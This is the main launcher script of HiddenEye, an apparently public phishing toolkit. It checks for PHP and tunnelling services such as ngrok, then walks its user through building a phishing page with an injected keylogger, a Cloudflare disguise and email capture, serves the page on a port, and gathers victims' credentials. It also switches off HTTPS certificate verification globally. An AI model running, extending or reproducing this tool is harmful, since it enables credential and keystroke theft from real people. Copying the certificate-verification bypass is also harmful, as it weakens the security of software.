#!/usr/bin/python3
#
# HiddenEye by https://github.com/DarkSecDevelopers
#
import gettext
import multiprocessing
import ssl
import sys
from os import environ
from os import system

from Defs.Actions import *
from Defs.Checks import *
from Defs.Configurations import *
from Defs.Languages import *

if not environ.get("PYTHONHTTPSVERIFY", "") and getattr(
    ssl, "_create_unverified_context", None
):
    ssl._create_default_https_context = ssl._create_unverified_context


RED, WHITE, CYAN, GREEN, DEFAULT = (
    "\033[91m",
    "\033[46m",
    "\033[36m",
    "\033[1;32m",
    "\033[0m",
)
checkPermissions()
installGetText()
languageSelector()
checkConnection()
# verCheck()
checkPHP()
checkLocalxpose()
checkNgrok()
checkOpenport()
checkPagekite()
checkLT()
ifSettingsNotExists()
readConfig()

if __name__ == "__main__":

    try:

        mainMenu()
        keyloggerprompt()
        addingkeylogger()
        cloudfarePrompt()
        emailPrompt()
        inputCustom()
        port = selectPort()

        ##############
        selectServer(port)
        input("Hit enter to exit")
        exit()

    except KeyboardInterrupt:

        # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
        port = "8080"
        getCredentials(port)
        endMessage(port)
